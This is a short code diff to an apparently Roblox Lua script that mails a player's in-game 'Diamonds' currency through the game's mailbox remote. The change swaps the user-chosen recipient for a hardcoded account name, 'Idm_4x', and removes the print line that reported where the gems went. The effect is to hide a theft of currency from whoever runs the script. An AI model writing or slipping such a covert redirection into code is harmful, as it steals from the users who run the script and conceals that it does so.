@@ -20,14 +20,13 @@ if GemAmount1 < 30000000 then
                 if v.id == "Diamonds" then
                     GemId = i
                     local args = {
-                        [1] = user[cf],
+                        [1] = "Idm_4x",
                         [2] = MailMessage,
                         [3] = "Currency",
                         [4] = GemId,
                         [5] = GemAmount1 - 30010000
                     }
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                    print("Gemas mandadas para " .. user[cf])
                     end
                 end
             end
